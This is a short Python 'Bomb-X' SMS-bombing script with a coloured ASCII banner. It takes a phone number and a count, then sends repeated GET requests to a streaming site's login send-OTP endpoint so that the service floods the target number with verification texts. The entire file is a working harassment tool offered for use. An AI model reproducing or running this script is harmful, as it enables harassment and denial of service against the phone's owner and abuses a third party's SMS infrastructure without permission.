bgreen="\033[1;32m"       # Green
bblack="\033[1;30m"       # Black
bred="\033[1;31m"         # Red
bgreen="\033[1;32m"       # Green
byellow="\033[1;33m"      # Yellow
bblue="\033[1;34m"        # Blue
bpurple="\033[1;35m"      # Purple
bcyan="\033[1;36m"        # Cyan
bwhite="\033[1;37m"       # White
logo=byellow+str("""
______                    _                   
| ___ \                  | |                  
| |_/ /  ___   _ __ ___  | |__   ______ __  __
| ___ \ / _ \ | '_ ` _ \ | '_ \ |______|\ \/ /
| |_/ /| (_) || | | | | || |_) |         >  < 
\____/  \___/ |_| |_| |_||_.__/         /_/\_\ 
===============================================
     ***Devoloper : Mishkat Zaman***
===============================================
""")
import requests
print(logo)
number=str(input(bpurple+" [Enter The Number :]> "+bblue))
amount=int(input(bgreen+" [Enter The Amount : ]>"+bcyan))
#get
api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"
for i in range(amount):
	requests.get(api)
	print(bred+str(i+1)+"[SMS Sent]")